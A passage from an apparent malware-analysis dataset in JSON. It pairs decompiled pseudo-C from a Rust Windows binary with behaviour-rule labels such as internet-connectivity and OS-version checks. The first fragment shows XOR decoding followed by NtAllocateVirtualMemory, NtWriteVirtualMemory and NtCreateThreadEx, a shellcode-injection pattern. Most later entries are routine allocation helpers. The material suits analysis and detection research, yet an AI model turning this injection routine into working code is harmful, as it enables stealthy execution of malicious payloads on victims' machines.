(uVar2 << 0x10) >> 8 | uVar3 << 0x10 | uVar4 << 0x18) ^ uVar46);\n                        pauVar26 = pauStack648;\n                        for (pauVar16 = NULL; pauVar30 != pauVar16; pauVar16 = *pauVar16 + 1) {\n                            if (pauStack1392 == pauVar16) {\n                                uVar15 = 0x446000;\n                                pauVar26 = pauStack1392;\n                                unique0x1000517f = pauStack1392;\n                                goto code_r0x004043e4;\n                            }\n                            (*pauVar16)[*pauVar19] = (*pauVar16)[*pauVar19] ^ (*pauVar16)[*pauStack1360];\n                        }\n                        pauVar18 = 0x3a0;\n                        pauVar17 = sym.core::slice::index::__impl_core::ops::index::Index_I__for__T__::index::hf1353b16eb9f7dff\n                                             (pauStack640, 0x3a0, pauStack1328, pauStack632);\n                        bVar45 = true;\n                        pauVar16 = pauStack1248;\n                    }\n                    uStack1184 = 0x3a0;\n                    pauVar16 = 0x3a0 - *(pauVar26[0x39] + 0xf);\n                    _auStack1176 = CONCAT88(stack0xfffffffffffffb70, pauVar16);\n                    pauStack1216 = NULL;\n                    uStack616 = pauVar16;\n                    _auStack1192 = pauVar26;\n                    uVar46 = sub.ntdll.dll_NtAllocateVirtualMemory\n                                       (pauStack1272, &pauStack1216, 0, &uStack616, 0x3000, 0x40);\n                    pauStack1352 = pauStack1352 & 0xffffffff00000000 | uVar46;\n                    if (uVar46 < 0) {\n                        pauStack584 = 0x4446a8;\n                        _auStack904 = CONCAT88(0x40ac70, &pauStack1352);\n                        uStack552 = auStack904;\n                        uVar15 = 0x4446b8;\n                    }\n                    else {\n                        pauStack928 = NULL;\n                        uVar46 = sub.ntdll.dll_NtWriteVirtualMemory\n                                           (pauVar19, pauStack1216, pauVar26, pauVar16, &pauStack928);\n                        pauStack1352 = pauStack1352 & 0xffffffff00000000 | uVar46;\n                        if (uVar46 < 0) {\n                            pauStack584 = 0x444710;\n                            _auStack904 = CONCAT88(0x40ac70, &pauStack1352);\n                            uStack552 = auStack904;\n                            uVar15 = 0x444720;\n                        }\n                        else {\n                            pauStack1416 = NULL;\n                            uVar15 = 0x2000000;\n                            uVar46 = sub.ntdll.dll_NtCreateThreadEx\n                                               (0, &pauStack1416, 0x2000000, 0, pauVar19, pauStack1216, 0, 0, 0x0, 0x0);\n                            pauStack1352 = pauStack1352 & 0xffffffff00000000 | uVar46;\n                            if (-1 < uVar46) {\n                                sym.core::ptr::drop_in_place_alloc::vec::Vec_u8__::hdd548e486ecdcdb8(auStack1192);\n                                sym.core::ptr::drop_in_place_alloc::vec::Vec_u8__::hdd548e486ecdcdb8(&pauStack1320);\n                                uStack1480 = 0x44a518;\n                                uStack1476 = 0;\n                                uStack1472 = 6;\n                                uStack1468 = 0;\n                                if ((*0x452058 != '\\0') &&\n                                   (ppauVar29 = sym.std::io::stdio::OUTPUT_CAPTURE::__getit::h72cfa132fd89b34c(), \n                                   ppauVar29 != NULL)) {\n                                    pauVar26 = *ppauVar29;\n                                    *ppauVar29 = NULL;\n                                    if (pauVar26 != NULL) {\n                                        pauVar19 = pauVar26[1];\n                                        pauStack1320 = pauVar26;\n                                        sub.KERNEL32.dll_AcquireSRWLockExclusive(pauVar19);\n                                        if ((*0x452160 & 0x7fffffffffffffff) == 0) {\n                                            uVar11 = 0;\n                                        }\n                                        else {\n                                            uVar11 = dbg.is_zero_slow_path();\n                                            uVar11 = uVar11 ^ 1;\n                                        }\n                                        _auStack1192 = ZEXT816(pauVar26[2]);\n                                        pauStack584 = 0x4445e8;\n                                        uStack576 = 0x1;\n                                        pauStack568 = NULL;\n                                        uStack552 = \n                                        \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                                        ;\n                                        pauStack544 = NULL;\n                                        cVar12 = dbg.write(auStack1192, 0x44a610, &pauStack584);\n                                        if (cVar12 == '\\0') {\n                                            if (uStack1184 != NULL) {\n                                                dbg.drop_in_place<std::io::error::Error>(uStack1184);\n                                            }\n                                        }\n                                        else {\n                                            iVar14 = 0x44a5c8;\n                                            if (uStack1184 != NULL) {\n                                                iVar14 = uStack1184;\n                                            }\n                                            dbg.drop_in_place<std::io::error::Error>(iVar14);\n                                        }\n                                        if (((uVar11 == 0) && ((*0x452160 & 0x7fffffffffffffff) != 0)) &&\n                                           (cVar12 = dbg.is_zero_slow_path(),  cVar12 == '\\0')) {\n                                            pauVar26[1][8] = 1;\n                                        }\n                                        sub.KERNEL32.dll_ReleaseSRWLockExclusive(pauVar19);\n                                        pauVar19 = *ppauVar29;\n                                        *ppauVar29 = pauVar26;\n                                        if (pauVar19 == NULL) {\n                                            return;\n                                        }\n                                        LOCK();\n                                        **pauVar19 = **pauVar19 + -1;\n                                        if (**pauVar19 != 0) {\n                                            return;\n                                        }\n                                        dbg.drop_slow<std::sync::mutex::Mutex<alloc::vec::Vec<u8, alloc::alloc::Global>>>\n                                                  (pauVar19);\n                                        return;\n                                    }\n                                }\n                                if ((*0x452060 != 3) && (*0x452060 != 3)) {\n                                    _auStack1192 = 0x452068;\n                                    pauStack584 = auStack1192;\n                                    dbg.call_inner(0x452060, CONCAT71(uVar15 >> 8, 1), &pauStack584, 0x44a6f8);\n                                }\n                                iVar14 = sym.std::sys_common::remutex::current_thread_unique_ptr::X::__getit::heeba4ab5a2f6977e\n                                                   ();\n                                if (iVar14 == 0) {\n                                    dbg.unwrap_failed(\"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                                                      , 0x46, &pauStack584, 0x449868);\n                                    do {\n                                        invalidInstructionException();\n                                    } while( true );\n                                }\n                                if (*0x452070 == iVar14) {\n                                    iVar13 = *0x4520a0 + 1;\n                                    if (iVar13 == 0) {\n                                        dbg.expect_failed(\"lock count overflow in reentrant mutexlibrary\\\\std\\\\src\\\\sys_common\\\\remutex.rs\"\n                                                          , 0x26, 0x44a958);\n                                        do {\n                                            invalidInstructionException();\n                                        } while( true );\n                                    }\n                                }\n                                else {\n                                    sub.KERNEL32.dll_AcquireSRWLockExclusive(0x452068);\n                                    iVar13 = 1;\n                                    *0x452070 = iVar14;\n                                }\n                                _auStack904 = CONCAT88(stack0xfffffffffffffc80, 0x452068);\n                                _auStack1192 = ZEXT816(auStack904);\n                                pauStack584 = 0x4445e8;\n                                uStack576 = 0x1;\n                                pauStack568 = NULL;\n                                uStack552 = \n                                \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                                ;\n                                pauStack544 = NULL;\n                                *0x4520a0 = iVar13;\n                                cVar12 = dbg.write(auStack1192, 0x44a588, &pauStack584);\n                                if (cVar12 == '\\0') {\n                                    if (uStack1184 != NULL) {\n                                        dbg.drop_in_place<std::io::error::Error>(uStack1184);\n                                    }\n                                    iVar14 = 0;\n                                }\n                                else {\n                                    iVar14 = 0x44a5c8;\n                                    if (uStack1184 != NULL) {\n                                        iVar14 = uStack1184;\n                                    }\n                                }\n                                piVar1 = auStack904._0_8_ + 0x38;\n                                *piVar1 = *piVar1 + -1;\n                                if (*piVar1 == 0) {\n                                    *(auStack904._0_8_ + 8) = 0;\n                                    sub.KERNEL32.dll_ReleaseSRWLockExclusive();\n                                }\n                                if (iVar14 == 0) {\n                                    return;\n                                }\n                                _auStack904 = CONCAT88(stack0xfffffffffffffc80, iVar14);\n                                _auStack1192 = CONCAT88(0x41cd00, &uStack1480);\n                                pauStack584 = 0x44a4e0;\n                                uStack576 = 0x2;\n                                pauStack568 = NULL;\n                                _auStack1176 = CONCAT88(0x434f90, auStack904);\n                                pauStack544 = 0x2;\n                                uStack552 = auStack1192;\n                                dbg.panic_fmt(&pauStack584, 0x44a500);\n                                do {\n                                    invalidInstructionException();\n                                } while( true );\n                            }\n                            pauStack584 = 0x444760;\n                            _auStack904 = CONCAT88(0x40ac70, &pauStack1352);\n                            uStack552 = auStack904;\n                            uVar15 = 0x444770;\n                        }\n                    }\n                    goto code_r0x004045e9;\n                }\n            }\n            iVar14 = 0x3a0;\n        }\n    }\ncode_r0x004044cf:\n    dbg.handle_alloc_error(iVar14);\n    do {\n        invalidInstructionException();\n    } while( true );\ncode_r0x004023cc:\n    piVar38 = 0x2;\n    if (piVar20 < 0x2) {\n        piVar38 = piVar20;\n    }\n    piVar44 = piVar20 - piVar38;\n    piVar38 = piVar33 + piVar38 * 2;\n    bVar45 = piVar20 != 0x1;\n    piVar20 = piVar44;\n    if (bVar45) goto code_r0x004023f2;\n    goto code_r0x004023c3;\ncode_r0x004023f2:\n    dbg.from_utf8(&pauStack928, *piVar33, piVar33[1]);\n    sym.alloc::slice::__impl__T__::to_vec_in::h7a438101d708d965(&pauStack1416, piVar33[2], piVar33[3]);\n    dbg.from_utf8(&pauStack1384, pauStack1416, pauStack1400);\n    if (pauStack1384 != NULL) {\n        pauStack888 = pauStack1400;\n        _auStack904 = CONCAT48(uStack1408, pauStack1416);\n        _auStack904 = CONCAT412(uStack1408._4_4_, _auStack904);\n        pcStack880 = pauStack1376;\n        pauStack872 = pauStack1368;\n        pauStack1288 = pauStack1368;\n        pauStack1296 = pauStack1376;\n    }\n    pauStack1312 = uStack1408;\n    pauStack1320 = pauStack1416;\n    pauStack1304 = pauStack1400;\n    _auStack1192 = CONCAT48(uStack920, pauStack928);\n    _auStack1192 = CONCAT412(uStack920._4_4_, _auStack1192);\n    _auStack1176 = ZEXT916(CONCAT18(pauStack1384 != NULL, pauStack912));\n    pauStack1128 = pauStack1288;\n    pauStack1144 = pauStack1400;\n    uStack1136 = pauStack1296;\n    auStack1160 = CONCAT412(uStack1408._4_4_, CONCAT48(uStack1408, pauStack1416));\n    pcVar27 = pauStack912;\n    if ((pauStack1384 | pauStack928) != 0) {\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(auStack1160);\n        goto code_r0x004023c0;\n    }\n    pauStack888 = pauStack1400;\n    _auStack904 = CONCAT48(uStack1408, pauStack1416);\n    _auStack904 = CONCAT412(uStack1408._4_4_, _auStack904);\n    if (pauStack912 == NULL) {\ncode_r0x00402595:\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(auStack904);\n        goto code_r0x004023c0;\n    }\n    pauVar26 = pauStack912;\n    if (*uStack1184 == 0x2d) {\n        if (pauStack912 == 0x1) goto code_r0x00402595;\n    }\n    else if (*uStack1184 == 0x2b) {\n        if (pauStack912[-1] + 0xf == NULL) goto code_r0x00402595;\n        uStack1184 = uStack1184 + 1;\n        pauVar26 = pauStack912[-1] + 0xf;\n    }\n    if (pauVar26 < 0x9) {\n        pauVar19 = NULL;\n        uVar39 = 0;\n        do {\n            uVar11 = uStack1184[pauVar19];\n            pcVar27 = uVar11;\n            if (9 < uVar11 - 0x30) goto code_r0x00402595;\n            uVar39 = (uVar11 + uVar39 * 10) - 0x30;\n            pauVar19 = *pauVar19 + 1;\n        } while (pauVar26 != pauVar19);\n    }\n    else {\n        pauVar19 = NULL;\n        uVar25 = 0;\n        do {\n            uVar23 = uVar25 * 10;\n            uVar24 = uStack1184[pauVar19] - 0x30;\n            pcVar27 = uVar24;\n            if ((9 < uVar24) || (uVar25 * 10 >> 0x20 != 0)) goto code_r0x00402595;\n            uVar39 = uVar23 + uVar24;\n            uVar25 = uVar39;\n            if (CARRY4(uVar23, uVar24)) goto code_r0x00402595;\n            pauVar19 = *pauVar19 + 1;\n        } while (pauVar26 != pauVar19);\n    }\n    pauStack1272 = uStack1408;\n    pcStack1264 = pauStack1400;\n    if (pauStack1416 != NULL) {\n        pauStack1352 = uStack1408;\n        _auStack904 = CONCAT48(uStack1408, pauStack1416);\n        _auStack904 = CONCAT412(uStack1408._4_4_, _auStack904);\n        pauStack888 = pauStack1400;\n        uStack1344 = pauStack1400;\n        uStack1340 = pauStack1400 >> 0x20;\n        pauVar26 = sym.core::hash::BuildHasher::hash_one::h76031b31976d9960\n                             (CONCAT44(uStack1476, uStack1480), CONCAT44(uStack1468, uStack1472), auStack904);\n        pcVar27 = pauVar26;\n        iVar14 = sym.hashbrown::raw::RawTable_T_A_::find::hc42f239b2befc81e(&uStack1464, pauVar26, auStack904);\n        if (iVar14 == 0) {\n            _auStack1176 = CONCAT88(stack0xfffffffffffffb70, pauStack888);\n            _auStack1192 = _auStack904;\n            iVar14 = sym.hashbrown::raw::RawTableInner_A_::find_insert_slot::h93b90925f579d537(&uStack1464, pauVar26);\n            uVar23 = (*pauStack1456)[iVar14] & 1;\n            pauVar19 = pauStack1456;\n            if ((auStack1448._0_8_ == 0) && (uVar23 != '\\0')) {\n                sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::h35de292f8b174cb7(&uStack1464, &uStack1480);\n                pauVar19 = pauStack1456;\n                iVar14 = sym.hashbrown::raw::RawTableInner_A_::find_insert_slot::h93b90925f579d537\n                                   (&uStack1464, pauVar26);\n            }\n            uVar11 = pauVar26 >> 0x39;\n            (*pauVar19)[iVar14] = uVar11;\n            pauVar19[1][iVar14 - 0x10U & uStack1464] = uVar11;\n            auStack1448._0_16_ = CONCAT88(auStack1448._8_8_ + 1, auStack1448._0_8_ - uVar23);\n            pcVar27 = pauStack1456[iVar14 * -2];\n            *pauStack1456[iVar14 * -2 + -1] = auStack1176._0_8_;\n            **(pcVar27 + -0x20) = auStack1192;\n            *(*(pcVar27 + -0x20) + 4) = uStack1188;\n            *(*(pcVar27 + -0x20) + 8) = uStack1184;\n            *(*(pcVar27 + -0x20) + 0xc) = uStack1184._4_4_;\n            *(*(pcVar27 + -0x10) + 8) = uVar39;\n        }\n        else {\n            *(iVar14 + -8) = uVar39;\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(auStack904);\n        }\n    }\n    goto code_r0x004023c0;\n    while( true ) {\n        pauVar18 = pauVar18[-1] + 0xf;\n        if (stack0xfffffffffffffb70 <= pauVar18) {\n            uVar15 = 0x4496e0;\n            pauVar26 = pauVar18;\n            goto code_r0x004043e4;\n        }\n        pauVar26 = puVar31 + *pauVar18;\n        if (uStack1184 <= pauVar26) {\n            uVar15 = 0x4496f8;\n            unique0x1000518f = uStack1184;\n            goto code_r0x004043e4;\n        }\n        if ((*pauVar18)[auStack1176._0_8_] != (*pauVar26)[_auStack1192]) break;\ncode_r0x00402da7:\n        if (pauVar18 <= pauVar17) goto code_r0x00402e12;\n    }\n    puVar31 = puVar31 + uStack1136;\n    pauVar26 = pauStack1392;\n    if (pauStack1104 != 0xffffffffffffffff) goto code_r0x00402d24;\n    goto code_r0x00402d40;\n}\n",
        "token_count": 33033
    },
    "d67055d7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.addr2line::path_push::hd67055d776aacc73(char **arg1, char *arg2, char *arg3)\n\n{\n    char *pcVar1;\n    char *arg2_00;\n    char cVar2;\n    \n    // addr2line::path_push::hd67055d776aacc73\n    if (arg3 != NULL) {\n        if ((*arg2 == '/') || (*arg2 == '\\\\')) goto code_r0x00404e67;\n        if ((0x1 < arg3) && (-0x41 < arg2[1])) {\n            if (arg3 < 0x4) {\n                if (arg3 == 0x3) goto code_r0x00404ed0;\n            }\n            else if (-0x41 < arg2[3]) {\ncode_r0x00404ed0:\n                if (*(arg2 + 1) == 0x5c3a) {\ncode_r0x00404e67:\n                    pcVar1 = sym.__rust_alloc(arg3, 1);\n                    if (pcVar1 != NULL) {\n                        sym.memcpy(pcVar1, arg2, arg3);\n                        if (arg1[1] != NULL) {\n                            sym.__rust_dealloc(*arg1, 1);\n                        }\n                        *arg1 = pcVar1;\n                        arg1[1] = arg3;\n                        arg1[2] = arg3;\n                        return;\n                    }\n                    dbg.handle_alloc_error(arg3);\n                    do {\n                        invalidInstructionException();\n                    } while( true );\n                }\n            }\n        }\n    }\n    pcVar1 = *arg1;\n    arg2_00 = arg1[2];\n    if (arg2_00 == NULL) {\n        cVar2 = '/';\n    }\n    else {\n        if (*pcVar1 == '\\\\') {\ncode_r0x00404eed:\n            cVar2 = '\\\\';\n        }\n        else {\n            cVar2 = '/';\n            if ((0x1 < arg2_00) && (-0x41 < pcVar1[1])) {\n                if (arg2_00 < 0x4) {\n                    if (arg2_00 == 0x3) goto code_r0x00404f16;\n                }\n                else if (-0x41 < pcVar1[3]) {\ncode_r0x00404f16:\n                    if (*(pcVar1 + 1) == 0x5c3a) goto code_r0x00404eed;\n                }\n            }\n        }\n        if (cVar2 == (arg2_00 + -1)[pcVar1]) goto code_r0x00404f4c;\n    }\n    if (arg2_00 == arg1[1]) {\n        sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::ha3e6c61a8dc85db7(arg1, arg2_00);\n        pcVar1 = *arg1;\n        arg2_00 = arg1[2];\n    }\n    pcVar1[arg2_00] = cVar2;\n    arg2_00 = arg2_00 + 1;\n    arg1[2] = arg2_00;\ncode_r0x00404f4c:\n    if (arg1[1] + -arg2_00 < arg3) {\n        sym.alloc::raw_vec::RawVec_T_A_::reserve::do_reserve_and_handle::h86283011cbd48da1(arg1, arg2_00, arg3);\n        pcVar1 = *arg1;\n        arg2_00 = arg1[2];\n    }\n    sym.memcpy(pcVar1 + arg2_00, arg2, arg3);\n    arg1[2] = arg2_00 + arg3;\n    return;\n}\n",
        "token_count": 819
    },
    "86283011": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve::do_reserve_and_handle::h86283011cbd48da1\n               (ulong *arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint64_t arg2_00;\n    int64_t iStack64;\n    ulong uStack56;\n    int64_t iStack48;\n    ulong uStack40;\n    int64_t iStack32;\n    uint64_t uStack24;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle::h86283011cbd48da1\n    if (!CARRY8(arg2, arg3)) {\n        iVar1 = arg1[1];\n        uVar2 = arg2 + arg3;\n        if (arg2 + arg3 < iVar1 * 2) {\n            uVar2 = iVar1 * 2;\n        }\n        arg2_00 = 8;\n        if (8 < uVar2) {\n            arg2_00 = uVar2;\n        }\n        if (iVar1 != 0) {\n            uStack40 = *arg1;\n            iStack32 = iVar1;\n        }\n        uStack24 = iVar1 != 0;\n        sym.alloc::raw_vec::finish_grow::hd07ace03c633096a(&iStack64, arg2_00, &uStack40);\n        if (iStack64 == 0) {\n            *arg1 = uStack56;\n            arg1[1] = arg2_00;\n            return;\n        }\n        if (iStack48 != 0) {\n            dbg.handle_alloc_error(uStack56);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 424
    },
    "a3e6c61a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::ha3e6c61a8dc85db7(ulong *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint64_t arg2_00;\n    int64_t iStack64;\n    ulong uStack56;\n    int64_t iStack48;\n    ulong uStack40;\n    int64_t iStack32;\n    uint64_t uStack24;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::ha3e6c61a8dc85db7\n    uVar2 = arg2 + 1;\n    if (uVar2 != 0) {\n        iVar1 = arg1[1];\n        if (uVar2 < iVar1 * 2) {\n            uVar2 = iVar1 * 2;\n        }\n        arg2_00 = 8;\n        if (8 < uVar2) {\n            arg2_00 = uVar2;\n        }\n        if (iVar1 != 0) {\n            uStack40 = *arg1;\n            iStack32 = iVar1;\n        }\n        uStack24 = iVar1 != 0;\n        sym.alloc::raw_vec::finish_grow::hd07ace03c633096a(&iStack64, arg2_00, &uStack40);\n        if (iStack64 == 0) {\n            *arg1 = uStack56;\n            arg1[1] = arg2_00;\n            return;\n        }\n        if (iStack48 != 0) {\n            dbg.handle_alloc_error(uStack56);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 414
    },
    "d07ace03": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::finish_grow::hd07ace03c633096a(ulong *arg1, int64_t arg2, ulong *arg3)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    // alloc::raw_vec::finish_grow::hd07ace03c633096a\n    if ((arg3[2] == 0) || (arg3[1] == 0)) {\n        if (arg2 != 0) {\n            iVar1 = sym.__rust_alloc(arg2, 1);\n            goto joined_r0x0040512a;\n        }\n        iVar1 = 1;\n    }\n    else {\n        iVar1 = fcn.0044111c(*0x4520e0, 0, *arg3, arg2);\njoined_r0x0040512a:\n        if (iVar1 == 0) {\n            arg1[1] = arg2;\n            arg2 = 1;\n            uVar2 = 1;\n            goto code_r0x00405147;\n        }\n    }\n    arg1[1] = iVar1;\n    uVar2 = 0;\ncode_r0x00405147:\n    arg1[2] = arg2;\n    *arg1 = uVar2;\n    return;\n}\n",
        "token_count": 281
    },
    "427e6771": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve::do_reserve_and_handle::h427e6771f06031d1\n               (ulong *arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint64_t arg2_00;\n    int64_t iStack64;\n    ulong uStack56;\n    int64_t iStack48;\n    ulong uStack40;\n    int64_t iStack32;\n    uint64_t uStack24;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle::h427e6771f06031d1\n    if (!CARRY8(arg2, arg3)) {\n        iVar1 = arg1[1];\n        uVar2 = arg2 + arg3;\n        if (arg2 + arg3 < iVar1 * 2) {\n            uVar2 = iVar1 * 2;\n        }\n        arg2_00 = 8;\n        if (8 < uVar2) {\n            arg2_00 = uVar2;\n        }\n        if (iVar1 != 0) {\n            uStack40 = *arg1;\n            iStack32 = iVar1;\n        }\n        uStack24 = iVar1 != 0;\n        sym.alloc::raw_vec::finish_grow::h90512744e4fb4046(&iStack64, arg2_00, &uStack40);\n        if (iStack64 == 0) {\n            *arg1 = uStack56;\n            arg1[1] = arg2_00;\n            return;\n        }\n        if (iStack48 != 0) {\n            dbg.handle_alloc_error(uStack56);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 429
    },
    "90512744": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::finish_grow::h90512744e4fb4046(ulong *arg1, int64_t arg2, ulong *arg3)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    // alloc::raw_vec::finish_grow::h90512744e4fb4046\n    if ((arg3[2] == 0) || (arg3[1] == 0)) {\n        if (arg2 != 0) {\n            iVar1 = sym.__rust_alloc(arg2, 1);\n            goto joined_r0x004052fa;\n        }\n        iVar1 = 1;\n    }\n    else {\n        iVar1 = fcn.0044111c(*0x4520e0, 0, *arg3, arg2);\njoined_r0x004052fa:\n        if (iVar1 == 0) {\n            arg1[1] = arg2;\n            arg2 = 1;\n            uVar2 = 1;\n            goto code_r0x00405317;\n        }\n    }\n    arg1[1] = iVar1;\n    uVar2 = 0;\ncode_r0x00405317:\n    arg1[2] = arg2;\n    *arg1 = uVar2;\n    return;\n}\n",
        "token_count": 281
    },
    "c616abfa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::hc616abfaa1b1f8af(ulong *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint64_t arg2_00;\n    int64_t iStack64;\n    ulong uStack56;\n    int64_t iStack48;\n    ulong uStack40;\n    int64_t iStack32;\n    uint64_t uStack24;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::hc616abfaa1b1f8af\n    uVar2 = arg2 + 1;\n    if (uVar2 != 0) {\n        iVar1 = arg1[1];\n        if (uVar2 < iVar1 * 2) {\n            uVar2 = iVar1 * 2;\n        }\n        arg2_00 = 8;\n        if (8 < uVar2) {\n            arg2_00 = uVar2;\n        }\n        if (iVar1 != 0) {\n            uStack40 = *arg1;\n            iStack32 = iVar1;\n        }\n        uStack24 = iVar1 != 0;\n        sym.alloc::raw_vec::finish_grow::h90512744e4fb4046(&iStack64, arg2_00, &uStack40);\n        if (iStack64 == 0) {\n            *arg1 = uStack56;\n            arg1[1] = arg2_00;\n            return;\n        }\n        if (iStack48 != 0) {\n            dbg.handle_alloc_error(uStack56);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 413
    },
    "5647f100": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t sym._alloc::ffi::c_str::NulError_as_core::fmt::Debug_::fmt::h5647f10081a09c27(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint64_t unaff_RBX;\n    uint64_t uVar4;\n    int64_t iStack56;\n    int64_t iStack48;\n    uint8_t uStack40;\n    char cStack39;\n    int64_t iStack32;\n    int64_t iStack24;\n    \n    // <alloc::ffi::c_str::NulError as core::fmt::Debug>::fmt::h5647f10081a09c27\n    iStack24 = arg1 + 8;\n    iStack32 = arg1;\n    uStack40 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), \"NulError`Y@\", 8);\n    iStack48 = 0;\n    cStack39 = '\\0';\n    iStack56 = arg2;\n    sym.core::fmt::builders::DebugTuple::field::h5de9a7eab4b37a6b(&iStack56, &iStack32, \"`Y@\");\n    sym.core::fmt::builders::DebugTuple::field::h5de9a7eab4b37a6b(&iStack56, &iStack24, 0x444908);\n    iVar1 = iStack56;\n    uVar4 = unaff_RBX & 0xffffffffffffff00 | uStack40;\n    if ((iStack48 != 0) && (uVar4 = CONCAT71((unaff_RBX & 0xffffffffffffff00) >> 8, 1),  uStack40 == 0)) {\n        if ((iStack48 == 1) && ((cStack39 != '\\0' && ((*(iStack56 + 0x30) & 4) == 0)))) {\n            cVar2 = (**(*(iStack56 + 0x28) + 0x18))(*(iStack56 + 0x20), 0x448de4, 1);\n            if (cVar2 != '\\0') goto code_r0x00405e25;\n        }\n        uVar3 = (**(*(iVar1 + 0x28) + 0x18))(*(iVar1 + 0x20), 0x44a40b, 1);\n        uVar4 = uVar3;\n    }\ncode_r0x00405e25:\n    return uVar4 & 0xffffffff;\n}\n",
        "token_count": 584
    },
    "23b21303": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
